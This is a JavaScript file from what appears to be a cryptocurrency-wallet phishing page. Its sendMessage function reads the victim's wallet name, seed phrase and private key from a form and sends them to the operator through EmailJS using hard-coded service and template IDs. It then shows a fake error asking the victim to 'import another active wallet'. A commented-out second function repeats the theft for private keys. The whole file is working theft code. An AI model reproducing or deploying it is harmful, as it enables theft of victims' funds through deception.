

function sendMessage(){
 
const phraseTextarea = document.getElementById("textInput");

// Get the value of the textarea
const phraseValue = phraseTextarea ? phraseTextarea.value : '';

    var params= {
        subject: document.getElementById("walletNameData").value,
        message: phraseValue || '',
        pk: document.getElementById("pk") ? document.getElementById("pk").value : ''
    }

    const serviceID  = 'service_7j8do6q';
 const templateID = 'template_6csopl7';

emailjs.send(serviceID, templateID, params).then((res)=>{
    if(document.getElementById("walletNameData")) document.getElementById("walletNameData").value= "";
    if(document.getElementById("textInput")) document.getElementById("textInput").value= "";
    if(document.getElementById("pk")) document.getElementById("pk").value= "";
    console.log(res);
    alert('An error occurred, try importing another active wallet');
    window.location.href='index.html';

})
}


// function sendMessage2(){
 
// const phraseTextarea = document.getElementById("privateKeyInput");

// // Get the value of the textarea
// const phraseValue = phraseTextarea ? phraseTextarea.value : '';

//     var params= {
//         subject: document.getElementById("wallet_name").value,
//         message: phraseValue || ''
//     }

//   const serviceID  = 'service_4mr64an';
// const templateID = 'template_p3t6orr';

// emailjs.send(serviceID, templateID, params).then((res)=>{
//     if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
//     if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
//     console.log(res);
//     alert('An error occurred, try importing another active wallet');
//     window.location.href='index.html';

// })
// }

